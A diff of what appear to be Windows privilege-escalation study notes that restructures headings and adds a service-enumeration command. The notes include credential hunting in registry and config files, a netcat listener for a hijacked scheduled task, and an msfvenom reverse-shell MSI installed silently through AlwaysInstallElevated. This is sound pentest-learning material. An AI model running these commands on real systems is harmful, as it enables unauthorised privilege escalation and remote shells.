@@ -38,8 +38,8 @@ type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr
 ```cmd
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
-
-# Scheduled Tasks ✅
+# Abusing Service Misconfigurations ✅
+## Scheduled Tasks ✅
 ```cmd
 schtasks /query /tn vulntask /fo list /v  # target system
 # ⬇️⬇️⬇️⬇️⬇️⬇️
@@ -57,7 +57,7 @@ nc -lvnp 4444 # our kali
 ------------------------------
 schtasks /run /tn vulntask # target system
 ```
-# AlwaysInstallElevated ✅
+## AlwaysInstallElevated ✅
 ```cmd
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
@@ -66,4 +66,8 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o
 # transfer malicious.msi file to our kali # target system
 ------------------------------
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi # target system
+```
+## Windows-Services-Enum ✅
+```cmd
+ sc qc apphostsvc
 ```
